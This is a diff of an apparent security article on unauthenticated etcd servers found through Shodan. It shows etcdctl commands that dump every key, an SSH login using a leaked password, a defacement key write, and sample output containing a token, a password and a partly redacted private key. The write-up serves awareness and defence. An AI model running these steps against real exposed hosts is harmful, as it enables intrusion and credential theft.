@@ -15,7 +15,7 @@ In such cases, malevolent actors may exploit the API using tools like curl or, p
 ## The Scenario
 A malicious actor is probing exposed services on [*Shodan*](https://www.shodan.io/) with the following simple query: `etcd`.  
 After several attempts, they discover an instance of etcd without authentication and attempt to list the *keys/values* using the following command:  
-```console
+```bash
 export ETCDCTL_ENDPOINTS="http://$EXPOSED_IP:2379" \
 && export ETCDCTL_API=3 \
 && etcdctl get --prefix ""
@@ -23,13 +23,16 @@ export ETCDCTL_ENDPOINTS="http://$EXPOSED_IP:2379" \
 
 Possible Output:  
 
-```console
+```bash
 /apis/url/
-https://my.api.com/v1/users/
+https://my.api.com/v1/users/  
+
 apis/token/
-wBtkA97eCyqPfQWtGBXf35T5AYbAuKGrQ1Ifq6wgzwjhZXtr87yQDgokSjfiVCVI
+wBtkA97eCyqPfQWtGBXf35T5AYbAuKGrQ1Ifq6wgzwjhZXtr87yQDgokSjfiVCVI  
+
 /ssh/user/
-system
+system  
+
 /ssh/pass/
 P4SsW0rd_+^"!
 ```  
@@ -41,18 +44,18 @@ P4SsW0rd_+^"!
 It's worth noting that, at this juncture, an attacker could potentially inflict damage on the system by deleting and/or modifying the values of the etcd keys.  
 In this specific scenario, if the target server also exposes SSH, the attacker might also attempt to gain access using the values of the keys */ssh/user/* and */ssh/pass/*:  
 
-```console
+```bash
 ssh system@$EXPOSED_IP 
 system password:  P4SsW0rd_+^"!
 ```   
 
 The attacker can also add a new key value:  
-```console
+```bash
 etcdctl put rooted P4wn3D!🖕
 ```  
 
 or retrieve etcd users and roles:  
-```console
+```bash
 etcdctl user list; etcdctl role list
 ```  
 
@@ -60,7 +63,7 @@ There have also been instances where [*PostgreSQL*](https://www.postgresql.org/)
 In that particular scenario, PostgreSQL was also exposed as a service on the server, allowing us to query a list of tables and all the data contained within them.  
 Furthermore, we discovered wildcard certificates for the entire domain of a company, intentionally redacted and obscured as follows:  
 
-```console
+```bash
 /apisix/ssl/982578101
 {"id":"423764178751193820","create_time":1662112733,"update_time":1689821613,"cert":"-----BEGIN CERTIFICATE-----\nMIIGLDCCBRSgAwIBAgIQCJY\n-----END CERTIFICATE-----\n-----BEGIN CERTIFICATE-----\nMITqCwtukZ7u9VLL3JAq3Wdy2moKLvvC8tVmRzkAe\n0xQCkRKIjbBG80MSyDX/R4uYgj6ZiNT/Zg6GI6RofgqgpDdssLc0XIRQEotxIZcK\nzP3pGJ9FCbMHmMLLyuBd+uCWvVcF2ogYAawufChS/PT61D9rqzPRS5I2uqa3tmIT\n44JhJgWhBnFMb7AGQkvNq9KNS9dd3GWc17H/dXa1enoxzWjE0hBdFjxPhUb0W3wi\n8o34/m8Fxw==\n-----END CERTIFICATE-----\n","key":"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAzF/2R4nLsR8JCsX3Pl1kAML/zy0fmBFRXhPWmE7SGYoiWciq\niIalocl4DM7b5KEk5XwsFdMIEovyy0fgTOhquBwI+t35v7BN5b/BV/zNXHlmqqSs\nCITYs+C/7Ez6C0rsC7pyAmOUaAat4FsaSzvm/Z84s2qwtdejcwnv\n-----END RSA PRIVATE KEY-----\n",
 "snis":["*.company.com","company.com"],"status":1,"validity_start":1689638400,"validity_end":1723593599}
